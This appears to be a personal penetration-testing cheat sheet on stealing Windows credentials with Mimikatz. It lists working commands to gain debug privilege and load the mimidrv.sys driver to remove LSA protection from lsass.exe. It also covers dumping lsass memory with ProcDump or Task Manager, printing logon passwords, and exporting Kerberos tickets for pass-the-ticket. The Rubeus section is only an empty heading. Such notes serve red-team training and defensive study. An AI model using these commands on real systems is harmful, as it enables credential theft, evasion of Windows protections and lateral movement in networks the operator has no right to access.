## Mimikatz and Rubeus


### Mimikatz

Lsass stores the Hashes because of the cached Kerberos tickets.
To dump the hashes we need elevated command prompt - either the Admin elevated or the NT Authority\System - it is because we need the SeDebugPrivilege to read and modify the process; lsass.exe is owned 

```cmd
mimikatz.exe
privilege::debug
```

In case where the LSA Protection is enabled we need the ability to execute the code in Windows Kernel. LSA Protection is there because of the Protected Processes Light (PPL), which is layered on top of the integrity level checks - event the System integrity process cannot modify or access the memory space of the System integrity process executing with the PPL. We can check the PPL inside the Registry in the DWORD RunAsPPL DWORD 1.

```cmd
reg query HKLM\System\CurrentControlSet\Control\Lsa
```

It is disabled by default. When that enable we need to execute the kernel driver to disable LSA protection. In mimikatz shell:

```cmd
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

mimidrv.sys must be in the same directory and we need SeLoadDriverPrivilege privileges. The mimidrv.sys may trigger AV, however to dump the lsass when the PPL is enabled we need to transport it. But we do not need Mimikatz to run it, we can do this as a Windows service.

We can do the memory dump with either the Task Manager (GUI only) or with the ProcDump from SysInternals, but this may also be detected by AV. 

With the TaskManager you right click on the bottom bar, open the task manager, then go to details, find lsass.exe process, right click and do the Memory Dump. In mimikatz you can load the dump by:
```cmd
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Check Credentials Guard psh:
```powershell
$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
```

with procdump from sysinternals you can dump lsass:
```cmd
procdump -ma lsass.exe lsass.dmp
```

List the tickets:
```cmd
sekurlsa::tickets
```

Export tickets:
```cmd
sekurlsa::tickets /export
```

Pass-the-Ticket with exported TGT: ^1a750f
```cmd
kerberos::ptt <kirbi_file>
```


You can use the Minidump from code folder.

### Rubeus

